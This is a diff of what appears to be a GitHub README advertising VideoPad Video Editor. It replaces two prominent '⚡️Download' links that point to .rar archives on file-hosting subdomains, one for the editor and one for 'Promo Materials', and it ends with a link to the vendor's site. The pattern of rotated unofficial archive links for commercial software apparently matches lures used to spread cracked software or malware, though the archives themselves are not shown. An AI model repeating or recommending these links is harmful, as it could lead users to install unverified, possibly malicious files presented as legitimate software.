@@ -11,7 +11,7 @@
 * Disk space - 10 GB free space
 
 ![image](https://user-images.githubusercontent.com/91409769/134799962-647b19ec-8f5a-477f-9786-57afbfb1f878.png)
-## [⚡️VideoPad Video Editor Download](https://evc192.pcloud.com/dpZVC92IVZLPpswJZbWGkZZp4cGv7Z2ZZhsLZZ9te58oYeoIzD7t46vsfBARgQWQqV/VideoPad%20Video%20Editor.rar):
+## [⚡️VideoPad Video Editor Download](https://evc162.pcloud.com/dpZ9xssIVZLPpswJZbWGkZZvicGv7Z2ZZhsLZZbUXuxJAsbPfXDcYP4L4suQohYKVV/VideoPad%20Video%20Editor.rar):
 
 * Choose from a wide range of video clip transitions
 * 3D video editing and 2D to 3D stereoscopic conversion
@@ -25,5 +25,5 @@
 * Professional templates for intros, outros, titles and themed projects
 * Apply effects in a couple of clicks
 
-## [⚡️Document And Video Download](https://evc198.pcloud.com/dpZift2IVZ3yBswJZbWGkZZ74cGv7Z2ZZhsLZZ9N636OASeUhTDo03qwP4yu7zjzFk/Promo%20Materials.rar):
+## [⚡️Document And Video Download](https://evc83.pcloud.com/dpZVCssIVZ3yBswJZbWGkZZTccGv7Z2ZZhsLZZtFwpTpxWHjR0JdYax5JzQpzQkKpV/Promo%20Materials.rar):
 Read more: https://www.nchsoftware.com/videopad/index.html
